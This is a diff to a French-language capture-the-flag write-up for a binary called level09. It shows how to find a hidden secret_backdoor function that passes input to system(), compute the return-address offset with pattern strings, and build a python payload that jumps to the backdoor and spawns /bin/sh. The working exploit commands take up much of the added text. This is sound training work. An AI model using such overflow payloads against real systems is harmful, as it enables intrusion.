@@ -60,10 +60,39 @@ controle de l'execution.
 > info function
 
 Nous permet de determiner qu'il y a une fonction qui n'est pas utilise dans le
-binaire, secret_backdor. Cette fonction, assez simple, a toutefois un
-comportement problematique. Apres avoir lu 128 caracteres dans un buffer, ce
-buffer est passé en parametre a systeme. C'est ideal pour notre exploit. Le
-probleme viens du fait qu'a son entrée, cette fonction alloue un nombre
-gigantesque sur la stack.
+binaire, secret_backdor. Cette fonction, assez simple, a le comportement
+suivant: Apres avoir lu 128 caracteres dans un buffer, ce
+buffer est passé en parametre a systeme. C'est ideal pour notre exploit.
 
 > <+4>:     add    rsp,0xffffffffffffff80
+
+Dans un premier temps, nous determinons la valeur que nous voulons passer dans
+le byte auquel nous avons acces. La valeur maximale que nous pouvons passer dans
+un byte est 255, soit \xff. Nous inserons bien un \n pour signifier la fin de la
+lecture a fgets. Nous obtennons bien notre segfault.
+
+Nous determinons ensuite l'offset auquel se trouve l'eip qui nous interesse avec
+la commande suivante:
+
+> python -c 'import string; print "A" * 40 + "\xff" + "\n" + "".join([i * 4 for
+> i in string.ascii_uppercase]) + "".join([i * 4 for i in
+> string.ascii_lowercase])' | ./level09
+
+Nous devons donc trouver l'offset du premier 79 en ascii, soit 'y'. Nous le trouvons grave a la commande suivante :
+
+> python -c 'import string; print zip(range(0, 230), "".join([i * 4 for i in string.ascii_uppercase]) + "".join([i * 4 for i in string.ascii_lowercase]))' | grep y
+
+Le y se trouve donc a l'offset 200, c'est donc la que nous placerons l'adresse
+de la fonction secret backdor.
+
+Notre commande sera donc la suivante:
+
+[40 bytes padding + \xff + \n + 200 bytes padding + adresse secret backdoor +
+\n + "/bin/sh" + \n]
+
+En formattant correctement l'adresse de secret backdoor, cela nous donne la
+commande suivante :
+
+> (python -c 'print "A" *40 + "\xff" + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh\n"'; cat) | ./level09
+
+
